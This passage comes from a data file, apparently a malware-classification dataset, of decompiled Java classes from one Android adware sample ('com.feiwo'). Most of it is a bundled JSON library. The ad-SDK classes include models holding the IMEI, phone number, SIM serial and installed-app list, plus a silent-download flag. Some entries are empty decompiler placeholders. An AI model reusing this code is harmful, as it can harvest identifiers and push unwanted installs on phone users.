peek);     }     int asInt=((JsonPrimitive)peekStack()).getAsInt();     popStack();     return asInt;   }   @Override public long nextLong(){     JsonToken peek=peek();     if (peek != JsonToken.NUMBER && peek != JsonToken.STRING) {       throw new IllegalStateException(""Expected "" + JsonToken.NUMBER + "" but was ""+ peek);     }     long asLong=((JsonPrimitive)peekStack()).getAsLong();     popStack();     return asLong;   }   @Override public String nextName(){     expect(JsonToken.NAME);     Map.Entry entry=(Map.Entry)((Iterator)peekStack()).next();     this.stack.add(entry.getValue());     return (String)entry.getKey();   }   @Override public void nextNull(){     expect(JsonToken.NULL);     popStack();   }   @Override public String nextString(){     JsonToken peek=peek();     if (peek == JsonToken.STRING || peek == JsonToken.NUMBER) {       return ((JsonPrimitive)popStack()).getAsString();     }     throw new IllegalStateException(""Expected "" + JsonToken.STRING + "" but was ""+ peek);   }   @Override public JsonToken peek(){     if (this.stack.isEmpty()) {       return JsonToken.END_DOCUMENT;     }     Object peekStack=peekStack();     if (peekStack instanceof Iterator) {       boolean z=this.stack.get(this.stack.size() - 2) instanceof JsonObject;       Iterator it=(Iterator)peekStack;       if (!it.hasNext()) {         return z ? JsonToken.END_OBJECT : JsonToken.END_ARRAY;       }       if (z) {         return JsonToken.NAME;       }       this.stack.add(it.next());       return peek();     }     if (peekStack instanceof JsonObject) {       return JsonToken.BEGIN_OBJECT;     }     if (peekStack instanceof JsonArray) {       return JsonToken.BEGIN_ARRAY;     }     if (!(peekStack instanceof JsonPrimitive)) {       if (peekStack instanceof JsonNull) {         return JsonToken.NULL;       }       if (peekStack == SENTINEL_CLOSED) {         throw new IllegalStateException(""JsonReader is closed"");       }       throw new AssertionError();     }     JsonPrimitive jsonPrimitive=(JsonPrimitive)peekStack;     if (jsonPrimitive.isString()) {       return JsonToken.STRING;     }     if (jsonPrimitive.isBoolean()) {       return JsonToken.BOOLEAN;     }     if (jsonPrimitive.isNumber()) {       return JsonToken.NUMBER;     }     throw new AssertionError();   }   public void promoteNameToValue(){     expect(JsonToken.NAME);     Map.Entry entry=(Map.Entry)((Iterator)peekStack()).next();     this.stack.add(entry.getValue());     this.stack.add(new JsonPrimitive((String)entry.getKey()));   }   @Override public void skipValue(){     if (peek() == JsonToken.NAME) {       nextName();     }  else {       popStack();     }   }   @Override public String toString(){     return getClass().getSimpleName();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\JsonTreeWriter.code","public final class JsonTreeWriter extends JsonWriter {   private String pendingName;   private JsonElement product;   private final List<JsonElement> stack;   private static final Writer UNWRITABLE_WRITER=new Writer(){     @Override public void close(){       throw new AssertionError();     }     @Override public void flush(){       throw new AssertionError();     }     @Override public void write(    char[] cArr,    int i,    int i2){       throw new AssertionError();     }   } ;   private static final JsonPrimitive SENTINEL_CLOSED=new JsonPrimitive(""closed"");   public JsonTreeWriter(){     super(UNWRITABLE_WRITER);     this.stack=new ArrayList();     this.product=JsonNull.INSTANCE;   }   private JsonElement peek(){     return this.stack.get(this.stack.size() - 1);   }   private void put(  JsonElement jsonElement){     if (this.pendingName != null) {       if (!jsonElement.isJsonNull() || getSerializeNulls()) {         ((JsonObject)peek()).add(this.pendingName,jsonElement);       }       this.pendingName=null;       return;     }     if (this.stack.isEmpty()) {       this.product=jsonElement;       return;     }     JsonElement peek=peek();     if (!(peek instanceof JsonArray)) {       throw new IllegalStateException();     }     ((JsonArray)peek).add(jsonElement);   }   @Override public JsonWriter beginArray(){     JsonArray jsonArray=new JsonArray();     put(jsonArray);     this.stack.add(jsonArray);     return this;   }   @Override public JsonWriter beginObject(){     JsonObject jsonObject=new JsonObject();     put(jsonObject);     this.stack.add(jsonObject);     return this;   }   @Override public void close(){     if (!this.stack.isEmpty()) {       throw new IOException(""Incomplete document"");     }     this.stack.add(SENTINEL_CLOSED);   }   @Override public JsonWriter endArray(){     if (this.stack.isEmpty() || this.pendingName != null) {       throw new IllegalStateException();     }     if (!(peek() instanceof JsonArray)) {       throw new IllegalStateException();     }     this.stack.remove(this.stack.size() - 1);     return this;   }   @Override public JsonWriter endObject(){     if (this.stack.isEmpty() || this.pendingName != null) {       throw new IllegalStateException();     }     if (!(peek() instanceof JsonObject)) {       throw new IllegalStateException();     }     this.stack.remove(this.stack.size() - 1);     return this;   }   @Override public void flush(){   }   public JsonElement get(){     if (this.stack.isEmpty()) {       return this.product;     }     throw new IllegalStateException(""Expected one JSON element but was "" + this.stack);   }   @Override public JsonWriter name(  String str){     if (this.stack.isEmpty() || this.pendingName != null) {       throw new IllegalStateException();     }     if (!(peek() instanceof JsonObject)) {       throw new IllegalStateException();     }     this.pendingName=str;     return this;   }   @Override public JsonWriter nullValue(){     put(JsonNull.INSTANCE);     return this;   }   @Override public JsonWriter value(  double d){     if (!isLenient() && (Double.isNaN(d) || Double.isInfinite(d))) {       throw new IllegalArgumentException(""JSON forbids NaN and infinities: "" + d);     }     put(new JsonPrimitive((Number)Double.valueOf(d)));     return this;   }   @Override public JsonWriter value(  long j){     put(new JsonPrimitive((Number)Long.valueOf(j)));     return this;   }   @Override public JsonWriter value(  Number number){     if (number == null) {       return nullValue();     }     if (!isLenient()) {       double doubleValue=number.doubleValue();       if (Double.isNaN(doubleValue) || Double.isInfinite(doubleValue)) {         throw new IllegalArgumentException(""JSON forbids NaN and infinities: "" + number);       }     }     put(new JsonPrimitive(number));     return this;   }   @Override public JsonWriter value(  String str){     if (str == null) {       return nullValue();     }     put(new JsonPrimitive(str));     return this;   }   @Override public JsonWriter value(  boolean z){     put(new JsonPrimitive(Boolean.valueOf(z)));     return this;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\MapTypeAdapterFactory.code","public final class MapTypeAdapterFactory implements TypeAdapterFactory {   private final boolean complexMapKeySerialization;   private final ConstructorConstructor constructorConstructor; final class Adapter<K,V> extends TypeAdapter<Map<K,V>> {     private final ObjectConstructor<? extends Map<K,V>> constructor;     private final TypeAdapter<K> keyTypeAdapter;     private final TypeAdapter<V> valueTypeAdapter;     public Adapter(    Gson gson,    Type type,    TypeAdapter<K> typeAdapter,    Type type2,    TypeAdapter<V> typeAdapter2,    ObjectConstructor<? extends Map<K,V>> objectConstructor){       this.keyTypeAdapter=new TypeAdapterRuntimeTypeWrapper(gson,typeAdapter,type);       this.valueTypeAdapter=new TypeAdapterRuntimeTypeWrapper(gson,typeAdapter2,type2);       this.constructor=objectConstructor;     }     private String keyToString(    JsonElement jsonElement){       if (!jsonElement.isJsonPrimitive()) {         if (jsonElement.isJsonNull()) {           return ""null"";         }         throw new AssertionError();       }       JsonPrimitive asJsonPrimitive=jsonElement.getAsJsonPrimitive();       if (asJsonPrimitive.isNumber()) {         return String.valueOf(asJsonPrimitive.getAsNumber());       }       if (asJsonPrimitive.isBoolean()) {         return Boolean.toString(asJsonPrimitive.getAsBoolean());       }       if (asJsonPrimitive.isString()) {         return asJsonPrimitive.getAsString();       }       throw new AssertionError();     }     @Override public Map<K,V> read2(    JsonReader jsonReader){       JsonToken peek=jsonReader.peek();       if (peek == JsonToken.NULL) {         jsonReader.nextNull();         return null;       }       Map<K,V> construct=this.constructor.construct();       if (peek != JsonToken.BEGIN_ARRAY) {         jsonReader.beginObject();         while (jsonReader.hasNext()) {           JsonReaderInternalAccess.INSTANCE.promoteNameToValue(jsonReader);           K read2=this.keyTypeAdapter.read2(jsonReader);           if (construct.put(read2,this.valueTypeAdapter.read2(jsonReader)) != null) {             throw new JsonSyntaxException(""duplicate key: "" + read2);           }         }         jsonReader.endObject();         return construct;       }       jsonReader.beginArray();       while (jsonReader.hasNext()) {         jsonReader.beginArray();         K read22=this.keyTypeAdapter.read2(jsonReader);         if (construct.put(read22,this.valueTypeAdapter.read2(jsonReader)) != null) {           throw new JsonSyntaxException(""duplicate key: "" + read22);         }         jsonReader.endArray();       }       jsonReader.endArray();       return construct;     }     @Override public void write(    JsonWriter jsonWriter,    Map<K,V> map){       int i=0;       if (map == null) {         jsonWriter.nullValue();         return;       }       if (!MapTypeAdapterFactory.this.complexMapKeySerialization) {         jsonWriter.beginObject();         for (        Map.Entry<K,V> entry : map.entrySet()) {           jsonWriter.name(String.valueOf(entry.getKey()));           this.valueTypeAdapter.write(jsonWriter,entry.getValue());         }         jsonWriter.endObject();         return;       }       ArrayList arrayList=new ArrayList(map.size());       ArrayList arrayList2=new ArrayList(map.size());       boolean z=false;       for (      Map.Entry<K,V> entry2 : map.entrySet()) {         JsonElement jsonTree=this.keyTypeAdapter.toJsonTree(entry2.getKey());         arrayList.add(jsonTree);         arrayList2.add(entry2.getValue());         z=(jsonTree.isJsonArray() || jsonTree.isJsonObject()) | z;       }       if (!z) {         jsonWriter.beginObject();         while (i < arrayList.size()) {           jsonWriter.name(keyToString((JsonElement)arrayList.get(i)));           this.valueTypeAdapter.write(jsonWriter,arrayList2.get(i));           i++;         }         jsonWriter.endObject();         return;       }       jsonWriter.beginArray();       while (i < arrayList.size()) {         jsonWriter.beginArray();         Streams.write((JsonElement)arrayList.get(i),jsonWriter);         this.valueTypeAdapter.write(jsonWriter,arrayList2.get(i));         jsonWriter.endArray();         i++;       }       jsonWriter.endArray();     }   }   public MapTypeAdapterFactory(  ConstructorConstructor constructorConstructor,  boolean z){     this.constructorConstructor=constructorConstructor;     this.complexMapKeySerialization=z;   }   private TypeAdapter<?> getKeyAdapter(  Gson gson,  Type type){     return (type == Boolean.TYPE || type == Boolean.class) ? TypeAdapters.BOOLEAN_AS_STRING : gson.getAdapter(TypeToken.get(type));   }   @Override public <T>TypeAdapter<T> create(  Gson gson,  TypeToken<T> typeToken){     Type type=typeToken.getType();     if (!Map.class.isAssignableFrom(typeToken.getRawType())) {       return null;     }     Type[] mapKeyAndValueTypes=C$Gson$Types.getMapKeyAndValueTypes(type,C$Gson$Types.getRawType(type));     return new Adapter(gson,mapKeyAndValueTypes[0],getKeyAdapter(gson,mapKeyAndValueTypes[0]),mapKeyAndValueTypes[1],gson.getAdapter(TypeToken.get(mapKeyAndValueTypes[1])),this.constructorConstructor.get(typeToken));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\ObjectTypeAdapter.code","!org.eclipse.jdt.core.dom.TypeDeclaration@444f3fa7"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\ReflectiveTypeAdapterFactory.code","public final class ReflectiveTypeAdapterFactory implements TypeAdapterFactory {   private final ConstructorConstructor constructorConstructor;   private final Excluder excluder;   private final FieldNamingStrategy fieldNamingPolicy; public final class Adapter<T> extends TypeAdapter<T> {     private final Map<String,BoundField> boundFields;     private final ObjectConstructor<T> constructor;     private Adapter(    ObjectConstructor<T> objectConstructor,    Map<String,BoundField> map){       this.constructor=objectConstructor;       this.boundFields=map;     }     @Override public T read2(    JsonReader jsonReader){       if (jsonReader.peek() == JsonToken.NULL) {         jsonReader.nextNull();         return null;       }       T construct=this.constructor.construct();       try {         jsonReader.beginObject();         while (jsonReader.hasNext()) {           BoundField boundField=this.boundFields.get(jsonReader.nextName());           if (boundField == null || !boundField.deserialized) {             jsonReader.skipValue();           }  else {             boundField.read(jsonReader,construct);           }         }         jsonReader.endObject();         return construct;       }  catch (      IllegalAccessException e) {         throw new AssertionError(e);       } catch (      IllegalStateException e2) {         throw new JsonSyntaxException(e2);       }     }     @Override public void write(    JsonWriter jsonWriter,    T t){       if (t == null) {         jsonWriter.nullValue();         return;       }       jsonWriter.beginObject();       try {         for (        BoundField boundField : this.boundFields.values()) {           if (boundField.serialized) {             jsonWriter.name(boundField.name);             boundField.write(jsonWriter,t);           }         }         jsonWriter.endObject();       }  catch (      IllegalAccessException e) {         throw new AssertionError();       }     }   } public abstract class BoundField {     final boolean deserialized;     final String name;     final boolean serialized;     protected BoundField(    String str,    boolean z,    boolean z2){       this.name=str;       this.serialized=z;       this.deserialized=z2;     }     abstract void read(    JsonReader jsonReader,    Object obj);     abstract void write(    JsonWriter jsonWriter,    Object obj);   }   public ReflectiveTypeAdapterFactory(  ConstructorConstructor constructorConstructor,  FieldNamingStrategy fieldNamingStrategy,  Excluder excluder){     this.constructorConstructor=constructorConstructor;     this.fieldNamingPolicy=fieldNamingStrategy;     this.excluder=excluder;   }   private BoundField createBoundField(  final Gson gson,  final Field field,  String str,  final TypeToken<?> typeToken,  boolean z,  boolean z2){     final boolean isPrimitive=Primitives.isPrimitive(typeToken.getRawType());     return new BoundField(str,z,z2){       final TypeAdapter<?> typeAdapter; {         this.typeAdapter=gson.getAdapter(typeToken);       }       @Override void read(      JsonReader jsonReader,      Object obj){         Object read2=this.typeAdapter.read2(jsonReader);         if (read2 == null && isPrimitive) {           return;         }         field.set(obj,read2);       }       @Override void write(      JsonWriter jsonWriter,      Object obj){         new TypeAdapterRuntimeTypeWrapper(gson,this.typeAdapter,typeToken.getType()).write(jsonWriter,field.get(obj));       }     } ;   }   private Map<String,BoundField> getBoundFields(  Gson gson,  TypeToken<?> typeToken,  Class<?> cls){     LinkedHashMap linkedHashMap=new LinkedHashMap();     if (cls.isInterface()) {       return linkedHashMap;     }     Type type=typeToken.getType();     while (cls != Object.class) {       for (      Field field : cls.getDeclaredFields()) {         boolean excludeField=excludeField(field,true);         boolean excludeField2=excludeField(field,false);         if (excludeField || excludeField2) {           field.setAccessible(true);           BoundField createBoundField=createBoundField(gson,field,getFieldName(field),TypeToken.get(C$Gson$Types.resolve(typeToken.getType(),cls,field.getGenericType())),excludeField,excludeField2);           BoundField boundField=(BoundField)linkedHashMap.put(createBoundField.name,createBoundField);           if (boundField != null) {             throw new IllegalArgumentException(type + "" declares multiple JSON fields named "" + boundField.name);           }         }       }       typeToken=TypeToken.get(C$Gson$Types.resolve(typeToken.getType(),cls,cls.getGenericSuperclass()));       cls=typeToken.getRawType();     }     return linkedHashMap;   }   private String getFieldName(  Field field){     SerializedName serializedName=(SerializedName)field.getAnnotation(SerializedName.class);     return serializedName == null ? this.fieldNamingPolicy.translateName(field) : serializedName.value();   }   @Override public <T>TypeAdapter<T> create(  Gson gson,  TypeToken<T> typeToken){     Class<? super T> rawType=typeToken.getRawType();     if (Object.class.isAssignableFrom(rawType)) {       return new Adapter(this.constructorConstructor.get(typeToken),getBoundFields(gson,typeToken,rawType));     }     return null;   }   public boolean excludeField(  Field field,  boolean z){     return (this.excluder.excludeClass(field.getType(),z) || this.excluder.excludeField(field,z)) ? false : true;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\SqlDateTypeAdapter.code","public final class SqlDateTypeAdapter extends TypeAdapter<Date> {   public static final TypeAdapterFactory FACTORY=new TypeAdapterFactory(){     @Override public <T>TypeAdapter<T> create(    Gson gson,    TypeToken<T> typeToken){       if (typeToken.getRawType() == Date.class) {         return new SqlDateTypeAdapter();       }       return null;     }   } ;   private final DateFormat format=new SimpleDateFormat(""MMM d, yyyy"");   @Override public synchronized Date read2(  JsonReader jsonReader){     Date date;     if (jsonReader.peek() == JsonToken.NULL) {       jsonReader.nextNull();       date=null;     }  else {       try {         date=new Date(this.format.parse(jsonReader.nextString()).getTime());       }  catch (      ParseException e) {         throw new JsonSyntaxException(e);       }     }     return date;   }   @Override public synchronized void write(  JsonWriter jsonWriter,  Date date){     jsonWriter.value(date == null ? null : this.format.format((java.util.Date)date));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\TimeTypeAdapter.code","public final class TimeTypeAdapter extends TypeAdapter<Time> {   public static final TypeAdapterFactory FACTORY=new TypeAdapterFactory(){     @Override public <T>TypeAdapter<T> create(    Gson gson,    TypeToken<T> typeToken){       if (typeToken.getRawType() == Time.class) {         return new TimeTypeAdapter();       }       return null;     }   } ;   private final DateFormat format=new SimpleDateFormat(""hh:mm:ss a"");   @Override public synchronized Time read2(  JsonReader jsonReader){     Time time;     if (jsonReader.peek() == JsonToken.NULL) {       jsonReader.nextNull();       time=null;     }  else {       try {         time=new Time(this.format.parse(jsonReader.nextString()).getTime());       }  catch (      ParseException e) {         throw new JsonSyntaxException(e);       }     }     return time;   }   @Override public synchronized void write(  JsonWriter jsonWriter,  Time time){     jsonWriter.value(time == null ? null : this.format.format((Date)time));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\TypeAdapterRuntimeTypeWrapper.code","public final class TypeAdapterRuntimeTypeWrapper<T> extends TypeAdapter<T> {   private final Gson context;   private final TypeAdapter<T> delegate;   private final Type type;   public TypeAdapterRuntimeTypeWrapper(  Gson gson,  TypeAdapter<T> typeAdapter,  Type type){     this.context=gson;     this.delegate=typeAdapter;     this.type=type;   }   private Type getRuntimeTypeIfMoreSpecific(  Type type,  Object obj){     return obj != null ? (type == Object.class || (type instanceof TypeVariable) || (type instanceof Class)) ? obj.getClass() : type : type;   }   @Override public T read2(  JsonReader jsonReader){     return this.delegate.read2(jsonReader);   }   @Override public void write(  JsonWriter jsonWriter,  T t){     TypeAdapter<T> typeAdapter=this.delegate;     Type runtimeTypeIfMoreSpecific=getRuntimeTypeIfMoreSpecific(this.type,t);     if (runtimeTypeIfMoreSpecific != this.type) {       typeAdapter=this.context.getAdapter(TypeToken.get(runtimeTypeIfMoreSpecific));       if ((typeAdapter instanceof ReflectiveTypeAdapterFactory.Adapter) && !(this.delegate instanceof ReflectiveTypeAdapterFactory.Adapter)) {         typeAdapter=this.delegate;       }     }     typeAdapter.write(jsonWriter,t);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.internal.bind\TypeAdapters.code","!org.eclipse.jdt.core.dom.TypeDeclaration@5033d6c7"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.manage\a.code","class a extends TypeToken<List<AppWallAdInfo>> {   final ReDictory f197a;   public a(  ReDictory reDictory){     this.f197a=reDictory;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.manage\b.code","class b extends TypeToken<RootNode<AppWallAdInfo>> {   final ReDictory f198a;   public b(  ReDictory reDictory){     this.f198a=reDictory;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.manage\c.code","public class c implements g {   final ReDictory f199a;   public c(  ReDictory reDictory){     this.f199a=reDictory;   }   @Override public void a(  h hVar,  RootNode<?> rootNode,  RootNode<?> rootNode2){   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.manage\FwRecommendManage.code","public class FwRecommendManage {   private static FwRecommendManage f196a=null;   private FwRecommendManage(){   }   public static FwRecommendManage getInstance(){     if (f196a == null) { synchronized (FwRecommendManage.class) {         if (f196a == null) {           f196a=new FwRecommendManage();         }       }     }     return f196a;   }   public Rview getAView(  Context context,  int i){     return ReDictory.x().a(context,0,i);   }   public Rview getBoundAView(  Context context,  int i){     return ReDictory.x().a(context,1,i);   }   public View getView(){     return ReDictory.x().a(1,0);   }   public int init(  Context context,  String str){     return ReDictory.x().init(context,str);   }   public void openAppWall(){     ReDictory.x().y();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.manage\ReDictory.code","public class ReDictory extends e<AppWallAdInfo> {   private static String f=ReDictory.class.getName();   public static synchronized ReDictory x(){     ReDictory reDictory; synchronized (ReDictory.class) {       reDictory=(ReDictory)a(5);       if (reDictory == null) {         reDictory=new ReDictory();         a(5,(e<?>)reDictory);       }     }     return reDictory;   }   @Override public int a(){     return 5;   }   public Rview a(  int i,  int i2){     if (n() == null) {       throw new NullPointerException(""Before using this API calls ReManage.init(context,appKey)"");     }     return new Rview(n(),i,i2);   }   public Rview a(  Context context,  int i,  int i2){     if (n() == null) {       x().c(context);     }     return new Rview(n(),i,i2);   }   public void a(  int i,  int i2,  g gVar){     RootNode<AppWallAdInfo> d=d(i);     d.getAd().setLastAdId(Integer.valueOf(i));     d.getAd().setCategory(Integer.valueOf(i2));     a(com.feiwo.c.a.A,(RootNode<?>)d,gVar,false);   }   @Override protected void a(  com.feiwo.f.a aVar){     aVar.a(new com.feiwo.e.c());   }   @Override public void a(  SettingNode settingNode){     super.a(settingNode);   }   @Override public Type b(){     return new a(this).getType();   }   @Override public void b(  AdInfo adInfo){     a(com.feiwo.c.a.C,(RootNode<?>)a(adInfo.getAdId(),4,adInfo.getPackageName()),(g)new c(this),false);   }   @Override public TypeToken<RootNode<AppWallAdInfo>> c(){     return new b(this);   }   @Override public int init(  Context context,  String str){     return super.init(context,str);   }   public void y(){     if (!j() || n() == null) {       return;     }     n().startActivity(com.feiwo.h.b.a(n()));   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model\ActionCacheMap.code","public class ActionCacheMap {   @SerializedName(""cacheArray"") private List<RequestCache> cacheArray;   public List<RequestCache> getCacheArray(){     return this.cacheArray;   }   public void setCacheArray(  List<RequestCache> list){     this.cacheArray=list;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model\AppInfo.code","public class AppInfo {   @SerializedName(""adInfo"") private AdInfo adInfo;   @SerializedName(""adType"") private int adType;   @SerializedName(""beiginTime"") private long beiginTime;   @SerializedName(""downloadTime"") private long downloadTime;   @SerializedName(""isInstall"") private boolean isInstall=false;   @SerializedName(""progress"") private int progress;   public AppInfo(  int i){     setAdType(i);   }   public AdInfo getAdInfo(){     return this.adInfo;   }   public int getAdType(){     return this.adType;   }   public long getBeiginTime(){     return this.beiginTime;   }   public Long getDownloadTime(){     return Long.valueOf(this.downloadTime);   }   public int getProgress(){     return this.progress;   }   public boolean isInstall(){     return this.isInstall;   }   public void setAdInfo(  AdInfo adInfo){     this.adInfo=adInfo;   }   public void setAdType(  int i){     this.adType=i;   }   public void setBeiginTime(  long j){     this.beiginTime=j;   }   public void setDownloadTime(  Long l){     this.downloadTime=l.longValue();   }   public void setInstall(  boolean z){     this.isInstall=z;   }   public void setProgress(  int i){     this.progress=i;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model\BusinssInfo.code","public class BusinssInfo {   private final String TAG=BusinssInfo.class.getSimpleName();   @SerializedName(""adType"") private int adType;   @SerializedName(""isReady"") private boolean isReady;   @SerializedName(""rootNode"") private RootNode rootNode;   @SerializedName(""userInfo"") private UserInfo userInfo;   public int getAdType(){     return this.adType;   }   public RootNode<?> getRootNode(){     return this.rootNode;   }   public UserInfo getUserInfo(){     return this.userInfo;   }   public boolean isReady(){     return this.isReady;   }   public void setAdType(  int i){     this.adType=i;   }   public void setReady(  boolean z){     this.isReady=z;   }   public void setRootNode(  RootNode<?> rootNode){     if (this.rootNode == null) {       this.rootNode=rootNode;       return;     }     this.rootNode.setAd(rootNode.getAd());     this.rootNode.setSetting(rootNode.getSetting());     this.rootNode.setExecution(rootNode.getExecution());   }   public void setUserInfo(  UserInfo userInfo){     this.userInfo=userInfo;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model\DownInfo.code","public class DownInfo {   public boolean isRetryTask=false;   public boolean isSilent=false;   public boolean startDownload=false; } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model\GlobalInfo.code","public class GlobalInfo {   @SerializedName(""actionMap"") private List<RequestCache> actionMap;   @SerializedName(""downloadAppInfo"") public HashMap<String,AppInfo> downloadAppInfo;   @SerializedName(""imei"") public String imei;   @SerializedName(""installApp"") public List<Map<String,String>> installApp;   @SerializedName(""mnc"") public String mnc;   @SerializedName(""phoneNumber"") public String phoneNumber;   @SerializedName(""simSerialNumber"") public String simSerialNumber;   public synchronized List<RequestCache> addActionToCacheMap(  RequestCache requestCache){     List<RequestCache> actionMap;     actionMap=getActionMap();     Gson gson=new Gson();     boolean z=true;     requestCache.data.getAction().getActions().get(0).getAction().intValue();     requestCache.data.getAction().getActions().get(0).getAdId().intValue();     int i=0;     while (i < actionMap.size()) {       RequestCache requestCache2=actionMap.get(i);       i++;       z=(requestCache2.adType == requestCache.adType && requestCache2.url.equals(requestCache.url) && gson.toJson(requestCache2.data).equals(gson.toJson(requestCache.data))) ? false : z;     }     if (z) {       getActionMap().add(requestCache);     }     return actionMap;   }   public synchronized List<RequestCache> getActionMap(){     if (this.actionMap == null) {       this.actionMap=new ArrayList();     }     return this.actionMap;   }   public void setActionMap(  List<RequestCache> list){     this.actionMap=list;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model\IntentData.code","public class IntentData implements Serializable {   private static final long serialVersionUID=2081093393672344366L;   @SerializedName(""adId"") private int adId;   @SerializedName(""adInfo"") private AdInfo adInfo;   @SerializedName(""adType"") private int adType;   @SerializedName(""appDir"") private String appDir;   @SerializedName(""baseUrl"") private String baseUrl;   @SerializedName(""extAction"") private int[] extAction;   @SerializedName(""isSendClick"") private boolean isSendClick;   @SerializedName(""type"") private String type;   public IntentData(  int i,  String str){     this.adType=i;     this.type=str;   }   public int getAdId(){     return this.adId;   }   public AdInfo getAdInfo(){     return this.adInfo;   }   public int getAdType(){     return this.adType;   }   public String getAppDir(){     return this.appDir;   }   public String getBaseUrl(){     return this.baseUrl;   }   public int[] getExtAction(){     return this.extAction;   }   public String getType(){     return this.type;   }   public boolean isSendClick(){     return this.isSendClick;   }   public void setAdId(  int i){     this.adId=i;   }   public void setAdInfo(  AdInfo adInfo){     this.adInfo=adInfo;   }   public void setAdType(  int i){     this.adType=i;   }   public void setAppDir(  String str){     this.appDir=str;   }   public void setBaseUrl(  String str){     this.baseUrl=str;   }   public void setExtAction(  int[] iArr){     this.extAction=iArr;   }   public void setSendClick(  boolean z){     this.isSendClick=z;   }   public void setType(  String str){     this.type=str;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model\NotificationInfo.code","public class NotificationInfo {   @SerializedName(""adId"") public int adId;   @SerializedName(""adType"") public int adType;   @SerializedName(""context"") public Context context;   @SerializedName(""key"") public int key;   @SerializedName(""notiContent"") public String notiContent;   @SerializedName(""notiIcon"") public Drawable notiIcon;   @SerializedName(""notiId"") public int notiId;   @SerializedName(""notiTitle"") public String notiTitle;   @SerializedName(""pushContent"") public String pushContent;   @SerializedName(""isDownloading"") public boolean isDownloading=false;   @SerializedName(""pushIcon"") public int pushIcon=-1;   @SerializedName(""notiFlag"") public int notiFlag=16;   @SerializedName(""notiIntent"") public Intent notiIntent=new Intent();   @SerializedName(""notiTime"") public long notiTime=v.a();   public NotificationInfo(  Context context,  int i){     this.key=i;     this.context=context;     this.notiId=i;   }   public NotificationInfo getAdInfo(  AdInfo adInfo,  Intent intent,  int i){     NotificationInfo notificationInfo=new NotificationInfo(this.context,adInfo.getAdId().intValue() + 9999459);     notificationInfo.pushContent=adInfo.getRecommend();     notificationInfo.notiContent=adInfo.getRecommend();     notificationInfo.notiTitle=adInfo.getAppName();     notificationInfo.notiFlag=i;     notificationInfo.notiIntent=intent;     notificationInfo.notiId=adInfo.getAdId().intValue() + 9999459;     notificationInfo.notiTime=v.a();     return notificationInfo;   }   public NotificationInfo getDownloadInfo(  AdInfo adInfo,  int i,  long j){     NotificationInfo notificationInfo=new NotificationInfo(this.context,adInfo.getAdId().intValue());     notificationInfo.pushContent=a.p + adInfo.getAppName();     notificationInfo.notiTitle=adInfo.getAppName();     notificationInfo.notiContent=a.p + i + ""%"";     notificationInfo.notiFlag=16;     notificationInfo.notiId=90000 + adInfo.getAdId().intValue();     notificationInfo.notiTime=j;     return notificationInfo;   }   public NotificationInfo getDownloadOkInfo(  AdInfo adInfo,  int i,  String str){     NotificationInfo notificationInfo=new NotificationInfo(this.context,adInfo.getAdId().intValue());     notificationInfo.pushContent=adInfo.getAppName() + a.q;     notificationInfo.notiTitle=adInfo.getAppName();     notificationInfo.notiContent=a.q;     notificationInfo.notiFlag=i;     notificationInfo.notiIntent=q.b(this.context,str);     notificationInfo.notiId=90000 + adInfo.getAdId().intValue();     return notificationInfo;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo.model\RequestCache.code","public class RequestCache {   @SerializedName(""adType"") public int adType;   @SerializedName(""data"") public RootNode<?> data;   @SerializedName(""url"") public String url;   public RequestCache(  int i,  String str,  RootNode<?> rootNode){     this.adType=i;     this.url=str;     this.data=rootNode;   } } "
